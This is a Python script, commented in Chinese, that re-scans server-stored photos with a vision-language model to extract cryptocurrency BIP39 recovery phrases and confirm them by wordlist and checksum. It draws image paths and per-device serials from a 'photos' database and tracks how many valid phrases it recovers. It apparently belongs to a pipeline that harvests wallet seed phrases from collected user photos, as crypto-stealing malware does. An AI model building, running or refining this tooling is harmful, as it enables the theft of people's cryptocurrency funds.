#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ds_rescan_failed.py — 对 BIP39 校验未通过的 AI 命中做「高清二次复扫」（v2）

背景：主扫描为省成本用 768px 压缩档；个别截图可能因清晰度导致个别词识别偏差 → 校验不过。
本工具只针对【未通过项】小集合重扫，并甄别首轮的幻觉误报：
  · 输入：① ds_ai_hits.jsonl 中 checksum_ok=false 的条目
          ② ai_scan_log 中 note LIKE 'wordlist_fail:%' 的图
  · 二次扫描：原图直发（不压缩），主/软 prompt 依次；max_tokens=2500（防"思考吃光预算"）
  · 输出：adm888app/data/ds_ai_rescan.jsonl —— 标注：是否变化 / 二次BIP39结果 / 判定说明
  · 幂等：已复扫的 photo_id 跳过（重跑请自行清理输出文件）
用法：/root/venv/bin/python3 tools/ds_rescan_failed.py
"""
import os, sys, json, time, base64, subprocess
import importlib.util
import requests

spec = importlib.util.spec_from_file_location('scan', '/www/wwwroot/i.131422.com/tools/ds_mnemonic_scan.py')
m = importlib.util.module_from_spec(spec)
sys.argv = ['x']
spec.loader.exec_module(m)

BASE = '/www/wwwroot/i.131422.com'
HITS = os.path.join(BASE, 'adm888app/data/ds_ai_hits.jsonl')
OUT = os.path.join(BASE, 'adm888app/data/ds_ai_rescan.jsonl')

def psql(sql):
    r = subprocess.run(['runuser', '-u', 'postgres', '--', 'psql', '-d', 'panel', '-At', '-F', '\t', '-c', sql],
                       capture_output=True, text=True)
    return [l.split('\t') for l in r.stdout.splitlines() if l.strip()]

def call2(uri, prompt, max_tokens=2500):
    body = json.dumps({'model': m.CONF['model'], 'messages': [{'role': 'user', 'content': [
        {'type': 'text', 'text': prompt},
        {'type': 'image_url', 'image_url': {'url': uri}}]}], 'max_tokens': max_tokens}).encode()
    r = requests.post(m.DS_BASE + '/chat/completions', data=body,
                      headers={'Authorization': 'Bearer ' + m.DS_KEY, 'Content-Type': 'application/json'},
                      timeout=300)
    if r.status_code != 200:
        raise RuntimeError('HTTP %d %s' % (r.status_code, r.text[:120]))
    j = r.json()
    ch = j['choices'][0]
    msg = ch.get('message') or {}
    return {'content': (msg.get('content') or '').strip(),
            'finish': ch.get('finish_reason') or '',
            'tokens': int((j.get('usage') or {}).get('total_tokens') or 0)}

done = set()
if os.path.exists(OUT):
    for ln in open(OUT, encoding='utf-8'):
        try:
            done.add(int(json.loads(ln)['photo_id']))
        except Exception:
            pass

tasks, seen = [], set()
if os.path.exists(HITS):
    for ln in open(HITS, encoding='utf-8'):
        ln = ln.strip()
        if not ln:
            continue
        try:
            h = json.loads(ln)
        except Exception:
            continue
        if h.get('checksum_ok'):
            continue
        pid = int(h.get('photo_id') or 0)
        if not pid or pid in seen or pid in done:
            continue
        seen.add(pid)
        tasks.append((pid, h.get('serial') or '', h.get('words') or '', 'checksum_fail'))
for row in psql("SELECT photo_id, COALESCE(serial,''), note FROM ai_scan_log WHERE note LIKE 'wordlist_fail:%';"):
    pid = int(row[0])
    if pid in seen or pid in done:
        continue
    seen.add(pid)
    tasks.append((pid, row[1], row[2][14:][:200], 'wordlist_fail'))

print('待复扫:', len(tasks))
paths = {}
if tasks:
    ids = ','.join(str(t[0]) for t in tasks)
    for row in psql("SELECT id, bin_path FROM photos WHERE id = ANY(ARRAY[%s]);" % ids):
        paths[int(row[0])] = row[1]

def process(t):
    pid, serial, p1words, reason = t
    rec = {'photo_id': pid, 'serial': serial, 'reason': reason, 'pass1_words': p1words,
           'pass2_words': '', 'changed': None, 'words_diff': None, 'checksum_ok': None,
           'tokens': 0, 'note': '', 'ts': int(time.time() * 1000)}
    path = paths.get(pid)
    if not path or not os.path.exists(path):
        rec['note'] = 'file_missing'
        return rec
    raw = m.read_image_bytes(path)
    # 【2026-09-16】HEIC/GIF/WebP 支持：统一走 m.fullres_data_uri（不缩放，仅必要转码）
    uri = m.fullres_data_uri(raw)
    if not uri:
        rec['note'] = 'unsupported_format'
        return rec
    best, saw_false, last_note, toks = None, False, '', 0
    for prompt in (m.PROMPT_MAIN, m.PROMPT_SOFT):
        try:
            r = call2(uri, prompt)
            toks += r['tokens']
        except Exception as e:
            last_note = 'ERR:' + str(e)[:60]
            continue
        if r['content'] == '' and r['finish'] == 'length':
            last_note = '推理超限(finish=length)'
            continue
        f = m.parse_found(r['content'])
        if f and f.get('found'):
            ws = f['words']
            ok_wl, ok_chk = m.bip39_check(ws)
            if ok_wl:
                best = (ws, ok_chk)
                if ok_chk:
                    break
            last_note = '有词表外词: ' + ' '.join(ws)[:60]
        elif f and not f.get('found'):
            saw_false = True
            break
        elif r['content'] == '':
            last_note = '空回复'
        else:
            last_note = '非JSON回复: ' + r['content'][:60]
    rec['tokens'] = toks
    if best:
        ws, ok = best
        p2 = ' '.join(ws)
        rec['pass2_words'] = p2
        rec['checksum_ok'] = bool(ok)
        rec['changed'] = (p2 != (p1words or ''))
        a = (p1words or '').split()
        rec['words_diff'] = sum(1 for i in range(max(len(a), len(ws)))
                                if (a[i] if i < len(a) else '') != (ws[i] if i < len(ws) else ''))
        rec['note'] = '二次校验通过' if ok else '二次仍未过校验'
    elif saw_false:
        rec['changed'] = True
        rec['note'] = '二次判定：无词（首次疑似误报）'
    else:
        rec['note'] = '无产出：' + (last_note or '未知')
    return rec

results = []
for i, t in enumerate(tasks, 1):
    r = process(t)
    results.append(r)
    chk = '通过' if r['checksum_ok'] else ('未过' if r['checksum_ok'] is not None else '—')
    print(f"[{i}/{len(tasks)}] {r['serial']} #{r['photo_id']} | 变化={r['changed']} diff={r['words_diff']} | 二次={chk} | {r['note'][:70]}")

if results:
    with open(OUT, 'a', encoding='utf-8') as f:
        for r in results:
            f.write(json.dumps(r, ensure_ascii=False) + '\n')
passed = sum(1 for r in results if r['checksum_ok'])
cleared = sum(1 for r in results if '误报' in (r['note'] or ''))
print(f"\n=== 复扫完成: {len(results)} 张 | 二次校验通过 {passed} | 纠正为无词 {cleared} | "
      f"无产出 {sum(1 for r in results if (r['note'] or '').startswith('无产出'))} | "
      f"tokens {sum(r['tokens'] for r in results)}")
